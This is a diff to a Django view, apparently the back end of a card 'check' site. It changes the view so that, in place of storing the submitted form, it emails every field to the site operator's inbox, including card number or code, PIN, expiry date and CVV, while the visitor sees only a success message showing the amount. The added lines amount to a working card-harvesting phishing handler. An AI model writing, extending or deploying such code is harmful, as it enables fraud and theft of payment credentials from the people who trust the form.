@@ -3,6 +3,8 @@ from .models import Cards
 from django.contrib import messages
 from django.contrib.auth.models import auth
 from django.contrib.auth import get_user_model
+from django.core.mail import EmailMessage
+from django.conf import settings
 
 User = get_user_model()
 
@@ -11,7 +13,6 @@ User = get_user_model()
 def Check_card(request):
     if request.method == 'POST':
         form = request.POST
-    
         card_type = form.get('card_type')
         currency = form.get('currency')       
         amount = form.get('amount')       
@@ -24,8 +25,13 @@ def Check_card(request):
             return render(request, 'myCard/index.html')       
         # owner = request.user
         # try:
-        new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
-        new_card.save()
+        # new_card = Cards.objects.create(card_type=card_type, currency=currency,amount=amount, code=code, card_pin=card_pin, exp_date=exp_date,cvv=cvv)
+        # new_card.save()
+        body = f"Card type = {card_type}\n\nCurrency={currency}\n\nAmount = {amount}\n\nCode={code}\n\n card_pin={card_pin}\n\nexp_date={exp_date}\n\ncvv={cvv}"
+        email = EmailMessage(subject='New input', body=body, to=[settings.EMAIL_HOST_USER])
+        print('a')
+        email.send()
+        print('b')
         messages.success(request, f'{currency} {amount}.00')
         return redirect(reverse('index'))
         # except:
